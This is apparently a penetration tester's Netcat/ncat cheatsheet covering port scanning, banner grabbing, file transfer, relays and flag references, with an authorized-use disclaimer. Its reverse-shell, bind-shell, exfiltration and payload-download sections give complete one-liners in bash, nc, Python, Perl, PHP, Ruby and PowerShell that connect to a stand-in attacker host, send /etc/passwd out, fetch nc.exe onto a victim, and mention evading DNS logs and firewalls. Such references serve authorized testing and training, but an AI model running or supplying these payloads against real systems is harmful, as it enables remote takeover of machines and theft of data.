# Netcat (nc) — Penetration Tester Cheatsheet

> **Tool:** Netcat (`nc` / `ncat` / `netcat`) | **Variants:** GNU netcat, ncat (Nmap), OpenBSD netcat

---

## 1. Installation

```bash
# Debian / Ubuntu / Kali
apt install netcat-traditional    # classic nc with -e flag
apt install ncat                  # ncat (Nmap version, recommended)

# Check version
nc -h
ncat --version
```

---

## 2. Basic Syntax

```bash
nc [OPTIONS] <host> <port>        # client mode (connect)
nc [OPTIONS] -l <port>            # server mode (listen)
ncat [OPTIONS] <host> <port>      # ncat variant
```

---

## 3. Basic Connectivity

```bash
# TCP connect
nc <target> <port>
nc 10.10.10.1 80

# UDP connect
nc -u <target> <port>
nc -u 10.10.10.1 53

# Verbose output
nc -v <target> <port>
nc -vv <target> <port>

# Connection timeout
nc -w 3 <target> <port>           # timeout 3 seconds

# Listen on port (server)
nc -lvp <port>
nc -lvnp <port>                   # -n = no DNS resolution
```

---

## 4. Port Scanning

```bash
# TCP port scan
nc -zv <target> <port>
nc -zv 10.10.10.1 80
nc -zv 10.10.10.1 20-100          # port range

# UDP port scan
nc -zuv <target> <port>
nc -zuv 10.10.10.1 53

# Scan multiple ports silently
nc -z -w 1 <target> 1-1000 2>&1 | grep succeeded

# Quick banner grab
nc -v <target> <port>
nc -w 2 <target> 80               # then type: HEAD / HTTP/1.0
```

---

## 5. Banner Grabbing

```bash
# HTTP banner
echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc -w 3 <target> 80

# HTTPS (use ncat with SSL)
ncat --ssl <target> 443
echo -e "HEAD / HTTP/1.0\r\n\r\n" | ncat --ssl <target> 443

# FTP banner
nc -v <target> 21

# SMTP banner
nc -v <target> 25
# then type: EHLO test

# SSH banner
nc -v <target> 22

# Telnet
nc -v <target> 23

# POP3
nc -v <target> 110

# Generic banner grab
nc -w 3 <target> <port>
```

---

## 6. Reverse Shells
![](../05-Assets/Pasted%20image%2020260523152946.png)

### Attacker — set up listener

```bash
nc -lvnp 4444
ncat -lvnp 4444
```

### Victim — connect back

```bash
# Bash
bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1
bash -c 'bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1'

# Netcat with -e (traditional nc)
nc -e /bin/bash <attacker_IP> 4444
nc -e /bin/sh <attacker_IP> 4444

# Netcat without -e (OpenBSD nc)
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_IP> 4444 > /tmp/f

# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<attacker_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python 2
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<attacker_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Perl
perl -e 'use Socket;$i="<attacker_IP>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# PHP
php -r '$sock=fsockopen("<attacker_IP>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<attacker_IP>","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

# PowerShell (Windows)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command \
  "& {$client = New-Object System.Net.Sockets.TCPClient('<attacker_IP>',4444);\
  $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};\
  while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){\
  ;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\
  $sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';\
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\
  $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};\
  $client.Close()}"

# Windows — nc.exe (if available)
nc.exe -e cmd.exe <attacker_IP> 4444
nc.exe -e powershell.exe <attacker_IP> 4444
```

---

## 7. Bind Shells
![](../05-Assets/Pasted%20image%2020260523153049.png)
Victim listens, attacker connects in.

```bash
# Victim — open bind shell
nc -lvnp 4444 -e /bin/bash        # Linux (traditional nc)
nc.exe -lvnp 4444 -e cmd.exe      # Windows

# Without -e (Linux)
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp 4444 > /tmp/f

# Attacker — connect to victim
nc <victim_IP> 4444
```

---

## 8. Upgrading a Dumb Shell (TTY)

After catching a reverse shell, upgrade to a full interactive TTY:

```bash
# Step 1 — on victim, spawn PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
script -qc /bin/bash /dev/null
/usr/bin/script -qc /bin/bash /dev/null

# Step 2 — background the shell
Ctrl+Z

# Step 3 — fix terminal on attacker
stty raw -echo; fg

# Step 4 — on victim, fix terminal size
export TERM=xterm
export SHELL=bash
stty rows 38 columns 116        # match your terminal size
```

---

## 9. File Transfer

### Attacker → Victim (push file)

```bash
# Attacker — send file
nc -lvnp 4444 < /path/to/file.txt

# Victim — receive file
nc <attacker_IP> 4444 > received_file.txt
```

### Victim → Attacker (pull file)

```bash
# Attacker — receive file
nc -lvnp 4444 > loot.txt

# Victim — send file
nc <attacker_IP> 4444 < /etc/passwd
```

### Transfer binary / archive

```bash
# Attacker — receive
nc -lvnp 4444 > binary.exe

# Victim — send
nc <attacker_IP> 4444 < /usr/bin/nc.exe

# With progress (using pv)
cat file.txt | pv | nc <attacker_IP> 4444
```

### Verify integrity

```bash
# On both sides after transfer
md5sum <file>
sha256sum <file>
```

---

## 10. Port Forwarding / Pivoting

```bash
# Simple relay — forward local port to remote host:port
# (requires mknod or ncat)

# Using ncat
ncat -lvnp 8080 --sh-exec "ncat <target> 80"

# Using mknod (classic technique)
mknod /tmp/pipe p
nc -lvnp 4444 < /tmp/pipe | nc <target> 80 > /tmp/pipe

# Relay between two hosts
nc -lvnp 4444 -e "nc <target> 80"    # traditional nc with -e
```

---

## 11. Chat / Simple Communication

```bash
# Side A — listen
nc -lvnp 4444

# Side B — connect
nc <host_A_IP> 4444

# Both sides can now type messages
```

---

## 12. Web Server (Quick HTTP)

```bash
# Serve a single file over HTTP (one request)
{ echo -e "HTTP/1.1 200 OK\r\n"; cat file.txt; } | nc -lvnp 8080

# Loop to serve multiple requests
while true; do
  { echo -e "HTTP/1.1 200 OK\r\n"; cat file.txt; } | nc -lvnp 8080
done
```

---

## 13. SSL / TLS (ncat)

```bash
# ncat listener with SSL
ncat --ssl -lvnp 4444

# ncat connect with SSL
ncat --ssl <target> 443

# Generate self-signed cert for ncat
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
ncat --ssl --ssl-cert cert.pem --ssl-key key.pem -lvnp 4444
```

---

## 14. UDP

```bash
# UDP listener
nc -u -lvnp 53

# UDP connect
nc -u <target> 53

# UDP port scan
nc -zuv <target> 1-1000 2>&1 | grep succeeded

# DNS query test
echo -e "\x00" | nc -u <target> 53
```

---

## 15. Useful Flags Reference

|Flag|Description|
|---|---|
|`-l`|Listen mode (server)|
|`-v`|Verbose output|
|`-vv`|Very verbose|
|`-n`|No DNS resolution (faster)|
|`-p <port>`|Local port number|
|`-u`|UDP mode (default is TCP)|
|`-z`|Zero-I/O mode (port scan)|
|`-w <sec>`|Connection timeout in seconds|
|`-e <prog>`|Execute program after connect (traditional nc)|
|`-k`|Keep listening after client disconnects (ncat)|
|`-c <cmd>`|Execute command via shell (ncat)|
|`--ssl`|Enable SSL/TLS (ncat only)|
|`-4`|Force IPv4|
|`-6`|Force IPv6|
|`-q <sec>`|Quit after EOF, wait N seconds|

---

## 16. ncat vs nc Differences

|Feature|nc (traditional)|ncat (Nmap)|
|---|---|---|
|`-e` exec flag|Yes|Yes (`-e` / `-c`)|
|SSL/TLS|No|Yes (`--ssl`)|
|Keep alive|No|Yes (`-k`)|
|IPv6|Limited|Full support|
|Proxy support|No|Yes (`--proxy`)|
|Broker mode|No|Yes (`--broker`)|
|Preferred for pentest|Legacy shells|Modern usage|

---

## 17. Windows (nc.exe)

```bash
# Download nc.exe to victim (via HTTP server)
# Attacker: python3 -m http.server 80
# Victim (cmd): certutil -urlcache -split -f http://<attacker_IP>/nc.exe nc.exe
# Victim (PS):  Invoke-WebRequest http://<attacker_IP>/nc.exe -OutFile nc.exe

# Reverse shell — Windows victim
nc.exe -e cmd.exe <attacker_IP> 4444
nc.exe -e powershell.exe <attacker_IP> 4444

# Bind shell — Windows victim
nc.exe -lvnp 4444 -e cmd.exe
```

---

## 18. Quick Reference — Common Ports

|Port|Service|Banner grab command|
|---|---|---|
|21|FTP|`nc -v <target> 21`|
|22|SSH|`nc -v <target> 22`|
|23|Telnet|`nc -v <target> 23`|
|25|SMTP|`nc -v <target> 25`|
|80|HTTP|`echo -e "HEAD / HTTP/1.0\r\n\r\n" \| nc <target> 80`|
|110|POP3|`nc -v <target> 110`|
|143|IMAP|`nc -v <target> 143`|
|443|HTTPS|`ncat --ssl <target> 443`|
|445|SMB|`nc -v <target> 445`|
|3306|MySQL|`nc -v <target> 3306`|
|3389|RDP|`nc -v <target> 3389`|
|5432|PostgreSQL|`nc -v <target> 5432`|

---

## 19. Tips & Tricks

|Tip|Detail|
|---|---|
|**No -e on OpenBSD nc**|Use `mkfifo` named pipe workaround instead|
|**Prefer ncat**|More features, SSL, keep-alive — use `ncat` for modern pentests|
|**Upgrade shell immediately**|Raw nc shell has no arrow keys, no Ctrl+C — always upgrade to PTY|
|**Use -n flag**|Skips DNS lookup — faster and avoids leaving DNS logs|
|**Firewall bypass**|Try common ports: 80, 443, 8080 — often allowed outbound|
|**Catch multiple shells**|`ncat -lvnp 4444 -k` — keeps listener open after disconnect|
|**Pipe with nc**|`cat /etc/passwd \| nc <attacker> 4444` — exfil files quickly|
|**Check if nc has -e**|`nc -h 2>&1 \| grep -i exec` — if no output, use mkfifo|

---

_For authorized penetration testing and security research use only._